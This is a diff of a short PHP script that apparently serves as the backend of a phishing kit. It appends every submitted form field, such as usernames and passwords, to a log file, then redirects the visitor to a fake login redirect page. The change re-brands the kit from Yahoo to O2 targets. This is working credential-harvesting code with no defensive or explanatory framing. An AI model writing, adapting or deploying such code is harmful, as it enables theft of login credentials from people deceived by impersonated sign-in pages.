@@ -1,5 +1,5 @@
 <?php
-    $handle = fopen("../lOgZ/yahoo-logs.txt", "a");
+    $handle = fopen("../lOgZ/o2-logs.txt", "a");
     foreach($_POST as $variable => $value) {
         fwrite($handle, $variable);
         fwrite($handle, "=");
@@ -8,6 +8,6 @@
     }
     fwrite($handle, "\r\n");
     fclose($handle);    
-    header('Location: http://10.1.1.1/yahoo-login/redirect.html');
+    header('Location: http://10.1.1.1/o2-login/redirect.html');
     exit;
 ?>
